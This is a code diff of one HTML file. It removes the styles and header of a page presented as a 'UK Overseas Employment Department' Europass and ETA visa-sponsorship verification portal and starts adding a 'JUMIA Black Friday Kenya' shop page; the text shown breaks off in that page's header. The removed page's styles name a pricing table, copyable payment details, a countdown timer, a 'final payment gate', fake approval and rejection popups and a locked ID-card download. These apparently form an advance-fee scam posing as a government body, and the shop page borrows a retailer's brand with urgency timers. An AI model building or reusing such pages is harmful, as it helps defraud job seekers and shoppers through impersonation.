@@ -2,1841 +2,1868 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>UK Overseas Employment Department - Europass &amp; ETA Verification Portal</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>JUMIA Black Friday Kenya | Shop More. Spend Less!</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Anton&family=Montserrat:ital,wght@0,500;0,700;0,800;0,900;1,800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
     <style>
          :root {
-            --uk-navy-dark: #0b1c2d;
-            --uk-navy-mid: #162b48;
-            --uk-gold: #c5a059;
-            --uk-gold-light: #dfc285;
-            --uk-bg-ice: #f4f6f9;
-            --uk-card-white: #ffffff;
-            --text-dark: #111827;
-            --text-gray: #4b5563;
-            --success-green: #166534;
-            --error-red: #991b1b;
-        }
-        
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        }
-        
-        html {
-            -webkit-text-size-adjust: 100%;
-            text-size-adjust: 100%;
+            --jumia-orange: #f68b1e;
+            --jumia-fire: #e64a00;
+            --jumia-yellow: #ffd200;
+            --jumia-red: #e01b24;
+            --jumia-black: #121212;
         }
         
         body {
-            background-color: var(--uk-bg-ice);
-            color: var(--text-dark);
-            line-height: 1.5;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background-color: #f4f4f6;
+            color: #18181b;
+            overflow-x: hidden;
         }
         
-        img {
-            max-width: 100%;
-            height: auto;
+        .font-poster {
+            font-family: 'Anton', sans-serif;
+            letter-spacing: 0.02em;
         }
         
-        .ukpass-premium-identity-card img {
-            max-width: none;
+        .font-montserrat {
+            font-family: 'Montserrat', sans-serif;
+        }
+        /* Fiery Black Friday Poster Background */
+        
+        .bf-hero-bg {
+            background: radial-gradient(circle at 80% 25%, rgba(255, 210, 0, 0.35) 0%, transparent 45%), radial-gradient(circle at 18% 70%, rgba(224, 27, 36, 0.55) 0%, transparent 50%), linear-gradient(135deg, #c92a00 0%, #f66b0e 45%, #ff8c00 75%, #b82500 100%);
+        }
+        /* Jagged Brush Stroke Title Box */
+        
+        .brush-banner {
+            background: #111111;
+            clip-path: polygon(2% 4%, 99% 0%, 97% 95%, 0% 100%, 1% 52%);
+            box-shadow: 0 12px 25px rgba(0, 0, 0, 0.45);
         }
         
-        .hero-banner {
-            background: linear-gradient(135deg, var(--uk-navy-dark) 0%, var(--uk-navy-mid) 60%, #1e3a60 100%);
-            color: #ffffff;
-            padding: clamp(2rem, 6vw, 3.5rem) clamp(1rem, 4vw, 2rem) clamp(3rem, 7vw, 4.5rem);
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-            border-bottom: 4px solid var(--uk-gold);
+        .red-ribbon-tag {
+            background: linear-gradient(90deg, #d90429, #ef233c);
+            transform: rotate(-2deg);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.35);
         }
         
-        .hero-banner::after {
-            content: "";
-            position: absolute;
-            bottom: -20px;
-            left: 0;
-            right: 0;
-            height: 40px;
-            background: var(--uk-bg-ice);
-            clip-path: ellipse(60% 40% at 50% 100%);
+        .price-badge-slant {
+            background: linear-gradient(135deg, #e01b24 0%, #b80c14 100%);
+            transform: rotate(-2.5deg);
+            box-shadow: 0 8px 18px rgba(184, 12, 20, 0.4);
+        }
+        /* Star Size Badge */
+        
+        .star-badge {
+            background: #fff9db;
+            border: 2px solid #ffe066;
+            transition: all 0.18s ease;
         }
         
-        .hero-content {
-            max-width: 850px;
-            margin: 0 auto;
-            position: relative;
-            z-index: 2;
+        .star-badge:hover {
+            background: #ffd200;
+            border-color: #111111;
+            transform: translateY(-2px) scale(1.04);
         }
         
-        .hero-logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 1.25rem;
-            margin-bottom: 0.75rem;
+        .star-badge.active {
+            background: #111111;
+            color: #ffd200;
+            border-color: #111111;
+            box-shadow: 0 6px 14px rgba(0, 0, 0, 0.2);
         }
+        /* Clickable size chip on product cards */
         
-        .official-crest {
-            width: 55px;
-            height: 55px;
-            background: radial-gradient(circle, #dfc285 0%, #c5a059 100%);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-            border: 2px solid #ffffff;
-        }
-        
-        .official-crest svg {
-            width: 32px;
-            height: 32px;
-            fill: var(--uk-navy-dark);
-        }
-        
-        .hero-logo-text h2 {
-            font-size: clamp(1.2rem, 4vw, 1.9rem);
-            font-weight: 800;
-            letter-spacing: 0.5px;
-            line-height: 1.2;
-        }
-        
-        .hero-logo-text span {
-            font-size: 0.75rem;
-            letter-spacing: 3px;
-            text-transform: uppercase;
-            color: var(--uk-gold-light);
-            display: block;
-            margin-top: 4px;
-            font-weight: 700;
-        }
-        
-        .main-container {
-            width: 100%;
-            max-width: 950px;
-            margin: -2.5rem auto 4rem auto;
-            padding: 0 clamp(0.75rem, 3vw, 1.5rem);
-            position: relative;
-            z-index: 10;
-            box-sizing: border-box;
-        }
-        
-        .app-card {
-            width: 100%;
-            background: var(--uk-card-white);
-            border-radius: 16px;
-            box-shadow: 0 10px 35px rgba(11, 28, 45, 0.12);
-            padding: clamp(1.25rem, 4vw, 3rem);
-            box-sizing: border-box;
-            border-top: 5px solid var(--uk-gold);
-        }
-        
-        .progress-bar {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 3.5rem;
-            position: relative;
-            max-width: 500px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        
-        .progress-bar::before {
-            content: "";
-            position: absolute;
-            top: 50%;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background-color: #e2e8f0;
-            transform: translateY(-50%);
-            z-index: 1;
-        }
-        
-        .step-node {
-            background: var(--uk-card-white);
-            border: 3px solid #e2e8f0;
-            color: var(--text-gray);
-            width: 42px;
-            height: 42px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 700;
-            z-index: 2;
-            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
-        }
-        
-        .step-node.active {
-            border-color: var(--uk-gold);
-            background-color: var(--uk-gold);
-            color: var(--uk-navy-dark);
-            box-shadow: 0 0 12px rgba(197, 160, 89, 0.4);
-        }
-        
-        .step-node.completed {
-            border-color: var(--uk-navy-mid);
-            background-color: var(--uk-navy-mid);
-            color: white;
-        }
-        
-        .wizard-view {
-            display: none;
-        }
-        
-        .wizard-view.active {
-            display: block;
-        }
-        
-        h2.step-title {
-            font-size: clamp(1.1rem, 3.5vw, 1.4rem);
-            color: var(--uk-navy-dark);
-            margin-bottom: 2rem;
-            font-weight: 700;
-            border-bottom: 2px solid #edf2f7;
-            padding-bottom: 0.75rem;
-        }
-        
-        .form-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 1.5rem;
-            margin-bottom: 1.5rem;
-        }
-        
-        @media(min-width: 650px) {
-            .form-grid {
-                grid-template-columns: 1fr 1fr;
-            }
-        }
-        
-        .form-group {
-            display: flex;
-            flex-direction: column;
-        }
-        
-        .form-group label {
-            margin-bottom: 0.5rem;
-            font-weight: 700;
-            font-size: 0.75rem;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            color: var(--text-gray);
-        }
-        
-        .form-input {
-            width: 100%;
-            padding: 0.85rem 1rem;
-            border: 2px solid #e2e8f0;
-            border-radius: 6px;
-            font-size: 1rem;
-            color: var(--text-dark);
-            font-weight: 600;
-            transition: all 0.2s ease;
-            background-color: #f8fafc;
-        }
-        
-        .form-input:focus {
-            outline: none;
-            border-color: var(--uk-gold);
-            background-color: #ffffff;
-            box-shadow: 0 0 0 3px rgba(197, 160, 89, 0.15);
-        }
-        
-        .upload-wrapper {
-            border: 2px dashed var(--uk-gold);
-            border-radius: 8px;
-            padding: 1.5rem;
-            text-align: center;
-            background-color: #fcfbf9;
+        .size-chip {
+            transition: all 0.15s ease;
             cursor: pointer;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            transition: background-color 0.2s;
         }
         
-        .upload-wrapper:hover {
-            background-color: #f7f3eb;
-        }
-        
-        .pricing-table {
-            background-color: #f8fafc;
-            border: 1px solid #e2e8f0;
-            border-radius: 8px;
-            padding: 1.5rem;
-            margin-bottom: 1.5rem;
-        }
-        
-        .pricing-item {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 0.75rem;
-            font-size: 0.95rem;
-            font-weight: 500;
-            color: var(--text-gray);
-        }
-        
-        .pricing-item.total-row {
-            border-top: 2px dashed #cbd5e0;
-            padding-top: 0.75rem;
-            margin-top: 0.75rem;
-            font-weight: 800;
-            color: var(--uk-navy-dark);
-            font-size: 1.2rem;
-        }
-        
-        .currency-converter-box {
-            background-color: #fdfbf7;
-            border: 1px solid #e6d5b8;
-            border-radius: 8px;
-            padding: 1.25rem;
-            margin-bottom: 1.5rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .currency-label {
-            font-weight: 700;
-            color: #785a14;
-            font-size: 0.95rem;
-        }
-        
-        .currency-value {
-            font-size: 1.4rem;
-            font-weight: 900;
-            color: #59410a;
-            text-align: right;
-        }
-        
-        .bot-payment-details-card {
-            background: #fffbeb;
-            border: 2px solid var(--uk-gold);
-            border-radius: 10px;
-            padding: 1.25rem;
-            margin: 1.25rem 0;
-            text-align: left;
-        }
-        
-        .bot-payment-text {
-            font-size: 14px;
-            font-weight: bold;
-            color: var(--uk-navy-dark);
-            word-break: break-all;
-            white-space: pre-wrap;
-            user-select: all;
-            background: #ffffff;
-            padding: 0.75rem;
-            border-radius: 6px;
-            border: 1px solid #e6d5b8;
-            margin-bottom: 0.75rem;
-            min-height: 80px;
-        }
-        
-        .copy-btn {
-            background: var(--uk-gold);
-            color: var(--uk-navy-dark);
-            border: none;
-            padding: 0.5rem 1rem;
-            font-weight: 800;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 0.85rem;
-            width: 100%;
-        }
-        
-        .actions-tray {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 2.5rem;
-        }
-        
-        .action-btn {
-            padding: 0.85rem 2rem;
-            border-radius: 6px;
-            font-weight: 700;
-            cursor: pointer;
-            border: none;
-            font-size: 1rem;
-            transition: all 0.2s ease;
-        }
-        
-        .btn-fill {
-            background-color: var(--uk-navy-dark);
-            color: white;
-            box-shadow: 0 4px 12px rgba(11, 28, 45, 0.2);
-        }
-        
-        .btn-fill:hover {
-            background-color: var(--uk-navy-mid);
+        .size-chip:hover {
+            background: #111111;
+            color: #ffd200;
+            border-color: #111111;
             transform: translateY(-1px);
         }
+        /* Horizontal Shelf Scrollbar Hide */
         
-        .btn-outline {
-            background-color: #e2e8f0;
-            color: var(--text-dark);
-        }
-        
-        .btn-outline:hover {
-            background-color: #cbd5e0;
-        }
-        
-        .cashier-action-btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-            background-color: var(--uk-gold);
-            color: var(--uk-navy-dark);
-            text-decoration: none;
-            padding: 0.85rem 1.5rem;
-            border-radius: 6px;
-            font-weight: 800;
-            font-size: 1rem;
-            box-shadow: 0 4px 12px rgba(197, 160, 89, 0.3);
-            border: none;
-            cursor: pointer;
-            width: 100%;
-            transition: background-color 0.2s;
-        }
-        
-        .cashier-action-btn:hover {
-            background-color: #b38f49;
-        }
-        
-        .loading-container {
+        .no-scrollbar::-webkit-scrollbar {
             display: none;
-            text-align: center;
-            padding: 2rem;
-            background: #fff;
-            border-radius: 8px;
-            border: 1px solid #e2e8f0;
-            margin-top: 1rem;
         }
         
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #e2e8f0;
-            border-top: 4px solid var(--uk-gold);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 1rem auto;
+        .no-scrollbar {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
         }
+        /* Confetti Floating Particles */
+        
+        @keyframes floatSpark {
+            0%,
+            100% {
+                transform: translateY(0) rotate(0deg);
+            }
+            50% {
+                transform: translateY(-8px) rotate(12deg);
+            }
+        }
+        
+        .spark {
+            animation: floatSpark 3.2s ease-in-out infinite;
+        }
+        /* Invalid form field highlight */
+        
+        .field-invalid {
+            border-color: #e01b24 !important;
+            background-color: #fef2f2 !important;
+        }
+        /* Payment processing spinner */
         
         @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
+            to {
                 transform: rotate(360deg);
             }
         }
         
-        .timer-badge {
-            background: #fef2f2;
-            border: 1px solid #fecaca;
-            color: #991b1b;
-            padding: 0.75rem 1rem;
-            border-radius: 8px;
-            font-weight: 800;
-            font-size: 1.1rem;
-            text-align: center;
-            margin-bottom: 1rem;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 0.5rem;
-        }
-        
-        @keyframes shake {
-            0% {
-                transform: translate(1px, 1px) rotate(0deg);
-            }
-            10% {
-                transform: translate(-1px, -2px) rotate(-1deg);
-            }
-            20% {
-                transform: translate(-3px, 0px) rotate(1deg);
-            }
-            30% {
-                transform: translate(3px, 2px) rotate(0deg);
-            }
-            40% {
-                transform: translate(1px, -1px) rotate(1deg);
-            }
-            50% {
-                transform: translate(-1px, 2px) rotate(-1deg);
-            }
-            60% {
-                transform: translate(-3px, 1px) rotate(0deg);
-            }
-            70% {
-                transform: translate(3px, 1px) rotate(-1deg);
-            }
-            80% {
-                transform: translate(-1px, -1px) rotate(1deg);
-            }
-            90% {
-                transform: translate(1px, 2px) rotate(0deg);
-            }
-            100% {
-                transform: translate(1px, -2px) rotate(-1deg);
-            }
-        }
-        
-        .approval-success-popup {
-            display: none;
-            background: #f0fdf4;
-            border: 4px solid var(--success-green);
-            color: var(--success-green);
-            padding: 1.75rem;
-            border-radius: 12px;
-            margin-bottom: 2rem;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(22, 101, 52, 0.25);
-            animation: shake 0.6s ease-in-out infinite alternate;
-        }
-        
-        .approval-success-popup h3 {
-            font-size: 1.5rem;
-            font-weight: 900;
-            margin-bottom: 0.5rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
-        .approval-success-popup p {
-            font-size: 1.05rem;
-            font-weight: 800;
-        }
-        
-        .status-popup-banner {
-            display: none;
-            padding: 1.5rem;
-            border-radius: 12px;
-            margin-bottom: 2rem;
-            text-align: center;
-            font-weight: 800;
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
-        }
-        
-        .status-popup-banner.decline {
-            background: #fef2f2;
-            border: 2px solid #ef4444;
-            color: #991b1b;
-        }
-        
-        .status-popup-banner.delay {
-            background: #fffbeb;
-            border: 2px solid #f59e0b;
-            color: #b45309;
-        }
-        
-        .status-popup-banner.reject {
-            background: #7f1d1d;
-            border: 3px solid #dc2626;
-            color: #ffffff;
-            animation: shake 0.5s ease-in-out infinite alternate;
-        }
-        
-        .welcome-greet-banner {
-            background: linear-gradient(135deg, var(--uk-navy-dark) 0%, var(--uk-navy-mid) 100%);
-            color: #ffffff;
-            padding: 2rem;
-            border-radius: 12px;
-            margin-bottom: 2rem;
-            box-shadow: 0 6px 20px rgba(11, 28, 45, 0.15);
-            border-left: 5px solid var(--uk-gold);
-        }
-        
-        .welcome-greet-banner h3 {
-            font-size: 1.6rem;
-            font-weight: 800;
-            margin-bottom: 0.35rem;
-        }
-        
-        .welcome-greet-banner p {
-            opacity: 0.95;
-            font-size: 1.05rem;
-            font-weight: 500;
-        }
-        
-        .fulfillment-notice-box {
-            background: linear-gradient(135deg, #fdfbf7 0%, #f7f1e3 100%);
-            border-left: 5px solid var(--uk-gold);
-            border-radius: 8px;
-            padding: 1.75rem;
-            margin-bottom: 2.5rem;
-            box-shadow: 0 4px 15px rgba(197, 160, 89, 0.1);
-        }
-        
-        .fulfillment-notice-box h4 {
-            color: #785a14;
-            font-size: 1.15rem;
-            margin-bottom: 0.5rem;
-            font-weight: 800;
-        }
-        
-        .fulfillment-notice-box p {
-            color: #59410a;
-            font-size: 0.95rem;
-            line-height: 1.6;
-            font-weight: 600;
-        }
-        
-        .final-payment-gate {
-            background: #f8fafc;
-            border: 2px solid #cbd5e0;
-            border-radius: 12px;
-            padding: 1.75rem;
-            margin-bottom: 2.5rem;
-        }
-        
-        .final-payment-gate h3 {
-            color: var(--uk-navy-dark);
-            font-size: 1.25rem;
-            margin-bottom: 0.75rem;
-            font-weight: 800;
-        }
-        
-        .payment-channel-card {
-            background: #ffffff;
-            border: 1px solid #e2e8f0;
-            border-radius: 8px;
-            padding: 1.25rem;
-            margin-top: 1rem;
-        }
-        
-        .card-download-block {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            margin-bottom: 3.5rem;
-            background: #ffffff;
-            padding: clamp(1rem, 3vw, 2rem);
-            border-radius: 16px;
-            border: 1px solid #e2e8f0;
-            width: 100%;
-            box-sizing: border-box;
-        }
-        
-        .card-preview-wrap {
-            width: 100%;
-            max-width: 750px;
-            margin: 0 auto;
-            overflow: hidden;
-            container-type: inline-size;
-            container-name: cardpreview;
-        }
-        
-        .card-preview-scale {
-            width: 750px;
-            transform-origin: top center;
-            margin: 0 auto;
-        }
-        
-        @container cardpreview (max-width: 750px) {
-            .card-preview-scale {
-                transform: scale(calc(100cqw / 750));
-            }
-            .card-preview-wrap {
-                height: calc(475px * (100cqw / 750));
-            }
-        }
-        
-        .ukpass-premium-identity-card {
-            width: 750px;
-            height: 475px;
-            background: #ffffff;
-            border-radius: 24px;
-            box-shadow: 0 15px 45px rgba(11, 28, 45, 0.18);
-            border: 1px solid rgba(197, 160, 89, 0.4);
-            position: relative;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            color: var(--uk-navy-dark);
-        }
-        
-        .premium-card-header {
-            background: linear-gradient(135deg, var(--uk-navy-dark) 0%, var(--uk-navy-mid) 60%, #1e3a60 100%);
-            padding: 1.25rem 2rem;
-            position: relative;
-            color: white;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            height: 22%;
-            flex: 0 0 22%;
-            z-index: 5;
-            box-sizing: border-box;
-            border-bottom: 3px solid var(--uk-gold);
-        }
-        
-        .premium-card-header::after {
-            content: "";
-            position: absolute;
-            bottom: -20px;
-            left: 0;
-            right: 0;
-            height: 25px;
-            background: white;
-            clip-path: ellipse(60% 45% at 50% 0%);
-            z-index: 4;
-        }
-        
-        .premium-card-header.alt-header-theme {
-            background: linear-gradient(135deg, #162b48 0%, #224370 60%, #2f568f 100%);
-        }
-        
-        .premium-header-brand-block {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            z-index: 10;
-        }
-        
-        .premium-header-brand-block svg {
-            height: 38px;
-            fill: #ffffff;
-        }
-        
-        .premium-header-labels h3 {
-            font-size: 0.75rem;
-            letter-spacing: 2px;
-            text-transform: uppercase;
-            font-weight: 600;
-            color: var(--uk-gold-light);
-            line-height: 1;
-        }
-        
-        .premium-header-labels h2 {
-            font-size: clamp(1.15rem, 4vw, 1.8rem);
-            font-weight: 800;
-            margin: 0;
-            padding: 0;
-            border: none;
-            color: #ffffff;
-            line-height: 1.1;
-            letter-spacing: 0.5px;
-        }
-        
-        .premium-header-origin-tag {
-            font-weight: 400;
-            font-size: 0.75rem;
-            text-align: right;
-            opacity: 0.9;
-            line-height: 1.2;
-            z-index: 10;
-            letter-spacing: 0.5px;
-        }
-        
-        .premium-card-main-body {
-            display: flex;
-            flex-wrap: nowrap;
-            align-items: flex-start;
-            padding: 2rem;
-            flex: 1 1 auto;
-            position: relative;
-            background-color: #ffffff;
-            background-image: linear-gradient(to right, rgba(255, 255, 255, 1) 35%, rgba(255, 255, 255, 0.15) 70%, rgba(255, 255, 255, 0) 100%), url('https://images.unsplash.com/photo-1469854523086-cc02fe5d8800?auto=format&fit=crop&w=800&q=80');
-            background-size: cover;
-            background-position: right center;
-            z-index: 1;
-            box-sizing: border-box;
-            min-height: 0;
-        }
-        
-        .premium-uk-map-silhouette {
-            position: absolute;
-            right: 8%;
-            top: 5%;
-            height: 90%;
-            width: auto;
-            opacity: 0.2;
-            pointer-events: none;
-            z-index: 2;
-            filter: drop-shadow(0px 2px 8px rgba(11, 28, 45, 0.15));
-        }
-        
-        .premium-passport-photo-holder {
-            width: 22%;
-            min-width: 22%;
-            aspect-ratio: 1 / 1.26;
-            background-color: #f1f5f9;
-            border: 3px double var(--uk-gold);
-            border-radius: 12px;
-            overflow: hidden;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 1.5rem;
-            box-shadow: 0 4px 15px rgba(11, 28, 45, 0.1);
-            position: relative;
-            z-index: 5;
-            flex-shrink: 0;
-        }
-        
-        .premium-passport-photo-holder img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        
-        .premium-data-fields-column {
-            width: 48%;
-            flex: 1 1 48%;
-            min-width: 0;
-            display: flex;
-            flex-direction: column;
-            gap: 0.45rem;
-            justify-content: center;
-            position: relative;
-            z-index: 5;
-        }
-        
-        .premium-field-row {
-            display: flex;
-            align-items: center;
-            font-size: 0.85rem;
-            line-height: 1.3;
-            border-bottom: 1px dashed rgba(11, 28, 45, 0.1);
-            padding-bottom: 0.25rem;
-        }
-        
-        .premium-field-label {
-            width: 38%;
-            flex-shrink: 0;
-            font-weight: 700;
-            color: #5a6e85;
-            text-transform: uppercase;
-            font-size: 0.68rem;
-            letter-spacing: 0.75px;
-        }
-        
-        .premium-field-value {
-            width: 62%;
-            flex: 1 1 62%;
-            min-width: 0;
-            font-weight: 800;
-            color: var(--uk-navy-dark);
-            text-transform: uppercase;
-            font-size: 0.85rem;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        
-        .premium-card-status-pane {
-            width: 22%;
-            min-width: 22%;
-            flex-shrink: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: flex-end;
-            justify-content: space-between;
-            position: relative;
-            z-index: 5;
-        }
-        
-        .premium-status-pill-badge {
-            background-color: #f0fdf4;
-            border: 2px solid #bbf7d0;
-            color: #166534;
-            padding: 0.5rem 1rem;
-            border-radius: 8px;
-            font-weight: 900;
-            font-size: 0.85rem;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            box-shadow: 0 4px 10px rgba(22, 101, 52, 0.1);
-            text-align: center;
-        }
-        
-        .premium-qr-code-holder {
-            background: white;
-            padding: 0.35rem;
-            border: 1px solid #cbd5e0;
-            border-radius: 8px;
-            width: clamp(56px, 11vw, 85px);
-            height: clamp(56px, 11vw, 85px);
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-shrink: 0;
-        }
-        
-        .premium-qr-code-holder svg {
-            width: 100%;
-            height: 100%;
-        }
-        
-        .premium-card-footer-ribbon {
-            background-color: #f8fafc;
-            border-top: 1px solid rgba(11, 28, 45, 0.08);
-            padding: 0.65rem 2rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 0.7rem;
-            color: #5a6e85;
-            height: 13%;
-            flex: 0 0 13%;
-            position: relative;
-            z-index: 5;
-            border-bottom: 6px solid var(--uk-navy-dark);
-            box-sizing: border-box;
-            gap: 0.5rem;
-        }
-        
-        .card-export-host {
-            position: fixed;
-            left: -12000px;
-            top: 0;
-            width: 750px;
-            overflow: visible;
-            pointer-events: none;
-            z-index: -1;
-        }
-        
-        .card-export-host .ukpass-premium-identity-card {
-            width: 750px !important;
-            height: 475px !important;
-            transform: none !important;
-        }
-        
-        .card-export-host .card-preview-scale {
-            transform: none !important;
-        }
-        
-        .download-lock-note {
-            display: none;
-            width: 100%;
-            max-width: 400px;
-            margin-top: 0.75rem;
-            padding: 0.75rem 1rem;
-            background: #fef2f2;
-            border: 1px solid #fecaca;
-            border-radius: 8px;
-            color: #991b1b;
-            font-size: 0.9rem;
-            font-weight: 700;
-            text-align: center;
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border: 3px solid rgba(255, 255, 255, 0.35);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
         }
     </style>
 </head>
 
-<body>
+<body class="antialiased">
 
-    <header class="hero-banner">
-        <div class="hero-content">
-            <div class="hero-logo">
-                <div class="official-crest">
-                    <svg viewBox="0 0 24 24">
-                        <path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5zm0 2.18l7 3.89v4.93c0 4.54-3.15 8.81-7 9.87-3.85-1.06-7-5.33-7-9.87V8.07l7-3.89zM11 11h2v6h-2v-6zm0-4h2v2h-2V7z"/>
-                    </svg>
-                </div>
-                <div class="hero-logo-text">
-                    <h2>UK Overseas Employment Department</h2>
-                    <span>Europass &amp; ETA Verification for Visa Sponsorship</span>
+    <!-- TOP PROMO ANNOUNCEMENT STRIP -->
+    <div class="bg-[#111111] text-white text-xs sm:text-sm py-2 px-4 border-b border-yellow-400/30">
+        <div class="max-w-7xl mx-auto flex flex-wrap items-center justify-between gap-2">
+            <div class="flex items-center gap-2 font-bold">
+                <span class="bg-[#ffd200] text-black px-2 py-0.5 rounded font-extrabold uppercase tracking-wider text-[11px]">BLACK NOVEMBER FRIDAY</span>
+                <span>FREE Delivery in Nairobi for orders above <strong class="text-[#ffd200]">KES 1,999</strong>!</span>
+            </div>
+            <div class="flex items-center gap-3 text-xs">
+                <span class="text-gray-300 hidden sm:inline">Flash Deals End In:</span>
+                <div id="countdownTimer" class="flex items-center gap-1 font-mono font-extrabold text-black">
+                    <span class="bg-[#ffd200] px-1.5 py-0.5 rounded" id="cdHours">08</span><span class="text-white">:</span>
+                    <span class="bg-[#ffd200] px-1.5 py-0.5 rounded" id="cdMins">44</span><span class="text-white">:</span>
+                    <span class="bg-[#ffd200] px-1.5 py-0.5 rounded" id="cdSecs">59</span>
                 </div>
             </div>
         </div>
+    </div>
+
+    <!-- STICKY HEADER & SEARCH -->
+    <header class="sticky top-0 z-40 bg-white shadow-md border-b border-gray-200">
+        <div class="max-w-7xl mx-auto px-4 py-3 flex items-center justify-between gap-3">
+            <!-- Brand Logo -->
+            <a href="#top" class="flex items-center gap-1.5 shrink-0 group">
+                <span class="font-montserrat font-black text-2xl sm:text-3xl tracking-tight text-[#111111]">JUMIA</span>
+                <span class="w-7 h-7 rounded-full bg-[#f68b1e] text-white flex items-center justify-center shadow-sm group-hover:scale-105 transition">
+          <svg class="w-4 h-4 fill-current" viewBox="0 0 24 24"><path d="M12 2l2.9 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l7.1-1.01L12 2z"/></svg>
+        </span>
+            </a>
+
+            <!-- Search Input -->
+            <div class="flex-1 max-w-2xl relative">
+                <div class="flex items-center border-2 border-gray-300 focus-within:border-[#f68b1e] rounded-lg overflow-hidden bg-gray-50">
+                    <span class="pl-3 text-gray-400">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
+          </span>
+                    <input id="searchInput" type="text" placeholder="Search earpods, ladies shoes, jumpsuits, sneakers, Redmi..." class="w-full px-3 py-2 bg-transparent text-sm focus:outline-none" />
+                    <button onclick="clearSearch()" id="clearSearchBtn" class="hidden px-2 text-xs text-gray-500 hover:text-black font-bold">✕</button>
+                    <button onclick="applyFilters()" class="bg-[#f68b1e] hover:bg-[#e07b12] text-white font-bold text-xs sm:text-sm px-4 py-2.5 uppercase tracking-wide transition">
+            Search
+          </button>
+                </div>
+            </div>
+
+            <!-- Action Buttons -->
+            <div class="flex items-center gap-2 sm:gap-3 shrink-0">
+                <button onclick="openImageManager()" title="Customize External Image URLs" class="hidden md:flex items-center gap-1.5 px-3 py-2 rounded-lg border border-gray-300 hover:border-[#f68b1e] text-xs font-bold text-gray-700 hover:text-[#f68b1e] transition">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="m21 15-5-5L5 21"/></svg>
+          <span>Image URLs</span>
+        </button>
+
+                <button onclick="toggleWishlistFilter()" id="wishlistNavBtn" class="relative p-2 rounded-lg hover:bg-orange-50 text-gray-700 hover:text-[#e01b24] transition" title="Saved Items">
+          <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>
+          <span id="wishlistCount" class="absolute -top-0.5 -right-0.5 bg-[#e01b24] text-white text-[10px] font-extrabold w-4 h-4 rounded-full flex items-center justify-center">0</span>
+        </button>
+
+                <button onclick="openCart()" class="flex items-center gap-2 bg-[#111111] hover:bg-[#27272a] text-white px-3.5 py-2 rounded-lg font-bold text-sm shadow transition">
+          <div class="relative">
